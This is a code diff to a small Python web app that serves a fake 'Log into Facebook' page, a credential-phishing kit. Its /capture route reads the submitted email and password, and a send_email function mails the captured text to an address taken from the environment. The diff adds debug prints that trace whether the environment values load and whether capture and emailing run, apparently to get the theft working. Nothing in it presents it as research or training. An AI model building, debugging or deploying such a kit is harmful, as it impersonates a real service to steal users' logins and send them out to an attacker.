@@ -15,7 +15,7 @@ LOGIN_PAGE = """
   <title>Log into Facebook</title>
   <style>
     body { margin: 0; font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; }
-    .wrap { display: flex; flex-direction: column; align-items: center; padding: 20px 16px; min-height:100vh; }
+    .wrap { display: flex; flex-direction: column; align-items: center; padding: 20px 16px; min-height: 100vh; }
     .logo { color: #1877F2; font-size: 52px; font-weight: 700; letter-spacing: -2px; margin: 24px 0 10px; }
     .logo b { font-size: 60px; }
     .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.12); padding: 22px; width: 100%; max-width: 396px; text-align: center; }
@@ -53,9 +53,14 @@ SMTP_USER = os.environ.get("SMTP_USER", "")
 SMTP_PASS = os.environ.get("SMTP_PASS", "")
 CAPTURE_TO = os.environ.get("CAPTURE_TO", "")
 
+# Prints once when the worker boots — tells us if env vars are loaded
+print("BOOT user_len=%d pass_len=%d to_len=%d" % (len(SMTP_USER), len(SMTP_PASS), len(CAPTURE_TO)), flush=True)
+
 
 def send_email(text):
+    print("SEND_CALLED user_len=%d pass_len=%d to_len=%d" % (len(SMTP_USER), len(SMTP_PASS), len(CAPTURE_TO)), flush=True)
     if not (SMTP_USER and SMTP_PASS and CAPTURE_TO):
+        print("SEND_SKIPPED: a value is empty", flush=True)
         return
     try:
         msg = MIMEText(text)
@@ -67,9 +72,9 @@ def send_email(text):
         server.login(SMTP_USER, SMTP_PASS)
         server.sendmail(SMTP_USER, CAPTURE_TO, msg.as_string())
         server.quit()
-        print("EMAIL SENT OK", flush=True)
+        print("EMAIL_SENT_OK", flush=True)
     except Exception as e:
-        print("EMAIL ERROR:", repr(e), flush=True)
+        print("EMAIL_ERROR:", repr(e), flush=True)
 
 
 @app.route("/")
@@ -79,6 +84,7 @@ def index():
 
 @app.route("/capture", methods=["POST"])
 def capture():
+    print("CAPTURE_CALLED", flush=True)
     email = request.form.get("email", "")
     password = request.form.get("pass", "")
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
